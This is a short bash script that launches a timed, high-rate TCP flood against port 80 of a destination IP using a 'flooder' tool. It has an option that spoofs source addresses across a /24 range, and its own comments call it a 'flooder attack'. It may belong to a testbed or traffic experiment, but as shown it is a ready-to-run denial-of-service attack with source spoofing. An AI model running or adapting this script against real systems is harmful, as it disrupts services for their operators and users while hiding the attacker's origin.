#!/bin/bash

# Source Ip
SOURCE=$1

# Destination Ip
DEST=$2

# Spoof
SPOOF=$3

# Timeout
TIMEOUT=120


if [[ $SPOOF == "spoof" ]]
then

    # Spoof flooder attack
    timeout $TIMEOUT flooder --dst $DEST --highrate 200 --proto 6 --dportmin 80 --dportmax 80 --src $SOURCE --srcmask 255.255.255.0

elif [[ $SPOOF == "nospoof" ]]
then

    # No spoof flooder attack
    timeout $TIMEOUT flooder --dst $DEST --highrate 200 --proto 6 --dportmin 80 --dportmax 80 --src $SOURCE --srcmask 255.255.255.255
    
else

    echo "Not valid input"
    exit 1

fi
